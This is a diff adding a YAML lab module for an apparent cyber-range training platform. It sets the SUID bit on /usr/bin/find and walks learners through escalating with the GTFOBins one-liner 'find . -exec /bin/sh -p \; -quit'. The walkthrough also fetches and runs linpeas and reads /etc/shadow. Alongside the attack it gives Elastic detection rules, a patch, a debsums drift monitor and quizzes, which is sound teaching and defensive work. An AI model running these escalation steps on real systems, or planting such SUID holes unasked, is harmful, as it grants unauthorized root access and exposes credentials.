@@ -1,0 +1,416 @@
+# Bolt-on: SUID Bit on GTFOBins Binary (find)
+# -------------------------------------------
+# Install sets the SUID bit on /usr/bin/find. Any local user can then run
+#   find . -exec /bin/sh -p \; -quit
+# to spawn a root shell — GTFOBins SUID escalation via -exec (T1548.001).
+#
+# Patch removes the SUID bit and installs a daily debsums check that
+# alerts when system-binary permissions drift from the packaged baseline.
+#
+# Elastic rule UUIDs sampled from:
+#   Research/elastic-detection-rules/rules/linux/privilege_escalation_potential_suid_sgid_exploitation.toml
+#   Research/elastic-detection-rules/rules/linux/privilege_escalation_potential_suid_sgid_proxy_execution.toml
+
+id: bolton.privilege-escalation.suid-binary-gtfobins
+slug: suid-binary-gtfobins
+name: "SUID Bit on GTFOBins Binary (find)"
+version: "1.0.0"
+author: "Red Team Infra"
+last_updated: 2026-05-23
+
+category: privilege-escalation
+subcategory: suid
+tags:
+  - suid
+  - gtfobins
+  - find
+  - privilege-escalation
+  - linux
+description: >
+  Sets the SUID bit on /usr/bin/find via `chmod u+s /usr/bin/find`.
+  Because find honours -p when invoked with SUID, any local user can
+  spawn a root shell with `find . -exec /bin/sh -p \; -quit` — a
+  GTFOBins SUID privilege-escalation primitive (MITRE T1548.001).
+
+cve: []
+references:
+  - "https://attack.mitre.org/techniques/T1548/001/"
+  - "https://gtfobins.github.io/gtfobins/find/#suid"
+  - "https://man7.org/linux/man-pages/man2/setuid.2.html"
+
+mitre:
+  tactic:
+    id: TA0004
+    name: "Privilege Escalation"
+  technique:
+    id: T1548
+    name: "Abuse Elevation Control Mechanism"
+  subtechnique:
+    id: T1548.001
+    name: "Setuid and Setgid"
+
+detection:
+  coverage_status: covered
+  elastic_rules:
+    - rule_uuid: "28eb3afe-131d-48b0-a8fc-9784f3d54f3c"
+      rule_name: "Privilege Escalation via SUID/SGID"
+      rule_filename: "linux/privilege_escalation_potential_suid_sgid_exploitation.toml"
+      coverage: full
+      confidence: high
+      last_validated: 2026-05-23
+      notes: "Fires when a SUID-bit-flipped binary spawns a shell with uid=0 — exactly the find -exec /bin/sh -p case."
+    - rule_uuid: "341c6e18-9ef1-437e-bf18-b513f3ae2130"
+      rule_name: "Potential Privilege Escalation via SUID/SGID Proxy Execution"
+      rule_filename: "linux/privilege_escalation_potential_suid_sgid_proxy_execution.toml"
+      coverage: full
+      confidence: high
+      last_validated: 2026-05-23
+      notes: "Catches SUID-bit-set binary proxying execution to a sub-process (sh)."
+    - rule_uuid: "5b06a27f-ad72-4499-91db-0c69667bffa5"
+      rule_name: "SUID/SGUID Enumeration Detected"
+      rule_filename: "linux/discovery_suid_sguid_enumeration.toml"
+      coverage: indirect
+      confidence: medium
+      last_validated: 2026-05-23
+      notes: "Catches the `find / -perm -4000` recon attackers run before exploiting."
+  signal_sources:
+    - "Auditd PERM_MOD on /usr/bin/find with new mode mask & 04000"
+    - "Auditd execve of find with euid=0 spawned from non-root real uid"
+    - "osquery suid_bin table — new rows for /usr/bin/find"
+
+targets:
+  supported_os:
+    - family: linux
+      min_version: "20.04"
+      max_version: "24.04"
+  required_roles:
+    - linux_member
+    - standalone
+  required_services: []
+  required_domain_function_level: null
+
+depends_on: []
+conflicts_with: []
+
+side_effects:
+  global: false
+  network_visible: false
+  reboot_required: false
+
+install:
+  estimated_time_seconds: 30
+  steps:
+    - ansible_role: ansible.builtin.file
+      description: "Set SUID bit on /usr/bin/find."
+      role_vars:
+        path: "/usr/bin/find"
+        mode: "u+s"
+  verify:
+    probe: |
+      find /usr/bin/find -perm -4000 | grep -q .
+    timeout_seconds: 30
+    expect_exit_code: 0
+
+uninstall:
+  description: "Clear the SUID bit on /usr/bin/find."
+  estimated_time_seconds: 15
+  steps:
+    - ansible_role: ansible.builtin.file
+      description: "Clear SUID bit on /usr/bin/find."
+      role_vars:
+        path: "/usr/bin/find"
+        mode: "u-s"
+  verify:
+    probe: |
+      find /usr/bin/find -perm -4000 | grep -q . && exit 1 || exit 0
+    timeout_seconds: 15
+    expect_exit_code: 0
+
+patch:
+  description: >
+    Clear the SUID bit on /usr/bin/find and install a daily debsums
+    integrity check (/etc/cron.daily/bolton-debsums-check) that diffs
+    /usr/bin/* permissions against the dpkg-recorded baseline and
+    syslog-warns on drift. Catches future SUID-bit flips on packaged
+    binaries.
+  patch_reference:
+    - "https://attack.mitre.org/mitigations/M1028/"
+    - "https://manpages.ubuntu.com/manpages/jammy/man1/debsums.1.html"
+  complexity: low
+  side_effects:
+    - "debsums package installed if not already present"
+    - "Daily cron job runs at ~06:25 and may take ~30s on first run"
+    - "Syslog entries tagged 'bolton-debsums-check' on any mode drift"
+  rollback_supported: true
+  steps:
+    - ansible_role: ansible.builtin.file
+      description: "Clear SUID bit on /usr/bin/find."
+      role_vars:
+        path: "/usr/bin/find"
+        mode: "u-s"
+    - ansible_role: ansible.builtin.package
+      description: "Install debsums for binary integrity checks."
+      role_vars:
+        name: debsums
+        state: present
+    - ansible_role: ansible.builtin.copy
+      description: "Install daily debsums integrity check."
+      role_vars:
+        dest: "/etc/cron.daily/bolton-debsums-check"
+        content: |
+          #!/bin/sh
+          # bolton-debsums-check — alert on package-binary mode drift
+          /usr/bin/debsums -ec 2>&1 | while read line; do
+            logger -t bolton-debsums-check "DRIFT: $line"
+          done
+        owner: root
+        group: root
+        mode: "0755"
+  verify:
+    probe: |
+      ! find /usr/bin/find -perm -4000 2>/dev/null | grep -q . && test -x /etc/cron.daily/bolton-debsums-check
+    timeout_seconds: 30
+    expect_exit_code: 0
+  exploit_probe_after_patch: "webapp/bolton/exploit_probes/suid_find_check.sh"
+
+patch_revert:
+  description: "Re-set SUID bit on /usr/bin/find and remove debsums monitor — find -exec /bin/sh -p is root again."
+  estimated_time_seconds: 30
+  steps:
+    - ansible_role: ansible.builtin.file
+      description: "Remove debsums check."
+      role_vars:
+        path: "/etc/cron.daily/bolton-debsums-check"
+        state: absent
+    - ansible_role: ansible.builtin.file
+      description: "Re-set SUID bit on /usr/bin/find."
+      role_vars:
+        path: "/usr/bin/find"
+        mode: "u+s"
+  verify:
+    probe: |
+      find /usr/bin/find -perm -4000 | grep -q .
+    timeout_seconds: 30
+    expect_exit_code: 0
+  warning: "Local privilege escalation via `find . -exec /bin/sh -p \\; -quit` works again."
+
+cost:
+  storage_mb: 2
+  cpu_pct: 0
+  detectability: loud
+
+curriculum:
+  title: "SUID Bit + GTFOBins — Local Root via /usr/bin/find"
+  summary: >
+    Walkthrough of T1548.001 (Setuid/Setgid abuse) using the
+    GTFOBins-documented `find -exec /bin/sh -p \;` primitive on
+    tllinux01 (10.99.50.13). You enumerate SUID binaries, identify
+    /usr/bin/find as exploitable, look it up on GTFObins, pop a root
+    shell, and review the SUID-spawn detection ring.
+  learning_objectives:
+    - "Enumerate every SUID-root binary on a Linux host using find + linpeas."
+    - "Use GTFObins (gtfobins.github.io) to look up the per-binary escape primitive."
+    - "Execute the find -exec escape and explain why bash needs the -p flag to retain euid=0."
+    - "Map the technique to Elastic's SUID/SGID escalation rules."
+    - "Strip the SUID bit + deploy a debsums integrity drift check."
+  prerequisites:
+    - "SSH access to tllinux01 (10.99.50.13) as appuser via the bastion"
+  estimated_total_minutes: 25
+  steps:
+    - id: "01-enumerate-suid"
+      title: "Enumerate SUID binaries"
+      estimated_minutes: 5
+      markdown: |
+        ## Step 1 — Find every SUID-root binary
+
+        The canonical recon one-liner:
+
+        ```bash
+        # On tllinux01 as appuser
+        find / -perm -4000 -type f 2>/dev/null
+        # /usr/bin/passwd
+        # /usr/bin/sudo
+        # /usr/bin/mount
+        # /usr/bin/find         ← bolt-on artefact, NOT default
+        # /usr/bin/su
+        # ...
+        ```
+
+        Or let linpeas do it (and score interesting ones):
+
+        ```bash
+        curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh \
+          -o /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh
+        /tmp/linpeas.sh -a 2>/dev/null | grep -A30 "SUID"
+        ```
+
+        linpeas highlights **non-default** SUID binaries in red — find is
+        not in the default Ubuntu SUID set, so it gets flagged as
+        suspicious immediately.
+
+        > **Older alternatives:** `LinEnum.sh` (rebootuser) and
+        > `linux-smart-enumeration` cover the same ground. peass-ng's
+        > linpeas is the modern, actively-maintained choice; the
+        > others are good cross-checks.
+
+        **Detection callout:** **SUID/SGUID Enumeration Detected**
+        (`5b06a27f-ad72-4499-91db-0c69667bffa5`) catches the
+        `find / -perm -4000` recon command — it's indirect but a
+        strong precursor.
+      assessment:
+        question: "What does the `-perm -4000` flag to find actually match?"
+        options:
+          - "Files with mode EXACTLY equal to 4000 (only the SUID bit)"
+          - "Files where the SUID bit (octal 4000) is set, regardless of other bits"
+          - "Files modified in the last 4000 seconds"
+          - "Files larger than 4000 bytes"
+        correct_index: 1
+        explanation: >
+          The leading `-` makes it a mask test — match if (mode & 4000)
+          == 4000. Without the dash it would require exact equality and
+          miss the typical SUID binary mode like 4755 or 4711. This is
+          why the recon one-liner uses `-4000` and not `4000`.
+    - id: "02-gtfobins-lookup"
+      title: "GTFObins lookup for find"
+      estimated_minutes: 4
+      markdown: |
+        ## Step 2 — Look up the escape primitive
+
+        Open **https://gtfobins.github.io/gtfobins/find/#suid** in a
+        browser (or use `curl https://gtfobins.github.io/gtfobins/find/`
+        and grep for `SUID` if you're working from a tty-only shell).
+
+        The site shows the per-binary escape under each ability tag.
+        For `find` + SUID, the documented one-liner is:
+
+        ```bash
+        # Source: gtfobins.github.io/gtfobins/find/#suid
+        ./find . -exec /bin/sh -p \; -quit
+        ```
+
+        | Why each piece matters |
+        |---|
+        | `-exec` | tells find to spawn a sub-process per match |
+        | `/bin/sh -p` | spawn a shell, `-p` preserves euid (otherwise sh drops privs when ruid!=euid) |
+        | `\;` | terminate the -exec command |
+        | `-quit` | stop after the first match (avoids spamming a shell per file) |
+
+        GTFObins is a community-maintained registry — bookmark it.
+        Common high-value entries to remember: `vim`, `find`, `python3`,
+        `awk`, `less`, `tar`, `nmap`, `cp` (write to authorized_keys),
+        `bash` itself (with -p).
+
+        **Detection callout:** Looking up GTFObins on the *attacker*
+        side leaves no signal. The detection ring is entirely on the
+        execution phase.
+    - id: "03-fire-exploit"
+      title: "Fire the escape + verify root"
+      estimated_minutes: 4
+      markdown: |
+        ## Step 3 — Pop root
+
+        ```bash
+        # On tllinux01 as appuser
+        find . -exec /bin/sh -p \; -quit
+        # # id
+        # uid=1001(appuser) gid=1001(appuser) euid=0(root) groups=1001(appuser)
+        # # cat /etc/shadow
+        # root:$6$...
+        ```
+
+        Note the difference between `uid` and `euid` — the real uid
+        stayed appuser, but the effective uid (what permission checks
+        use) is 0. Without the `-p` flag, bash/sh would have detected
+        `ruid != euid` and called setresuid() to drop euid back to
+        ruid before showing you a prompt.
+
+        Quick post-exploit collection:
+
+        ```bash
+        # # whoami
+        # root             # actually returns root because euid=0
+        # # cat /etc/sudoers
+        # # ls -la /root
+        ```
+
+        **Detection callout:** Two HIGH-confidence Elastic rules fire on
+        this single execve:
+
+        - **Privilege Escalation via SUID/SGID**
+          (`28eb3afe-131d-48b0-a8fc-9784f3d54f3c`) — the SUID-bit
+          binary spawned a shell with uid=0
+        - **Potential Privilege Escalation via SUID/SGID Proxy
+          Execution** (`341c6e18-9ef1-437e-bf18-b513f3ae2130`) — the
+          SUID binary proxied execution to a sub-process (sh)
+
+        Both have negligible false-positive rates because legitimate
+        SUID binaries (passwd, sudo, mount) do their work without
+        spawning an unconstrained interactive shell.
+    - id: "04-patch-mitigate"
+      title: "Blue-team: strip SUID + monitor"
+      estimated_minutes: 8
+      markdown: |
+        ## Step 4 — Apply the patch + verify
+
+        Click the **Patch** action on this card. It:
+
+        1. `chmod u-s /usr/bin/find` — removes the SUID bit.
+        2. `apt-get install debsums` — for packaged-binary integrity.
+        3. Drops `/etc/cron.daily/bolton-debsums-check` that diffs
+           every /usr/bin/* against the dpkg-recorded baseline (mode +
+           checksum) and syslog-warns on drift.
+
+        Re-test:
+
+        ```bash
+        # On tllinux01 as appuser
+        ls -la /usr/bin/find
+        # -rwxr-xr-x ... /usr/bin/find    ← no SUID bit
+
+        find . -exec /bin/sh -p \; -quit
+        # $ id
+        # uid=1001(appuser) gid=1001(appuser) groups=1001(appuser)
+        # No euid=0 — find runs as the caller, so /bin/sh -p has nothing to preserve
+        ```
+
+        Exploit dead. Verify the watcher exists:
+
+        ```bash
+        ls -la /etc/cron.daily/bolton-debsums-check
+        sudo /etc/cron.daily/bolton-debsums-check   # dry-run
+        # (silent — no drift detected)
+        ```
+
+        Defence-in-depth beyond this card:
+
+        - CIS Benchmark **6.1.13**: scheduled audit of SUID/SGID files
+          (the debsums approach is one implementation).
+        - Mount filesystems hosting non-system content with `nosuid` —
+          /tmp, /var/tmp, /home should all be nosuid. Confirm with
+          `mount | grep nosuid`.
+        - Detection-tier: alert on `chmod 4*` or `chmod u+s` execve
+          from any non-package-manager parent process. Real package
+          managers do this routinely; everything else is suspicious.
+
+        > **Rollback:** `patch_revert` re-sets the SUID bit on
+        > /usr/bin/find and removes the debsums checker.
+      assessment:
+        question: "What does the `nosuid` mount option do, and why does it matter?"
+        options:
+          - "Prevents new SUID binaries from being created on the filesystem"
+          - "Causes the kernel to ignore SUID bits when executing binaries from that filesystem"
+          - "Blocks any process running on that filesystem from calling setuid()"
+          - "Encrypts the SUID bit so only root can read it"
+        correct_index: 1
+        explanation: >
+          `nosuid` is a mount-time flag (man 8 mount) that tells the
+          kernel to ignore the SUID/SGID bits on execve from that
+          filesystem. The SUID bit is still on the inode and visible
+          via ls, but the kernel won't grant elevated privileges.
+          That's why hardening guidance mounts /tmp, /home, and /var
+          with nosuid — even if an attacker plants a SUID binary
+          there, it won't escalate. The exploit in this walkthrough
+          only works because /usr is mounted without nosuid (which is
+          unavoidable — sudo and friends live there).
+
+status: stable
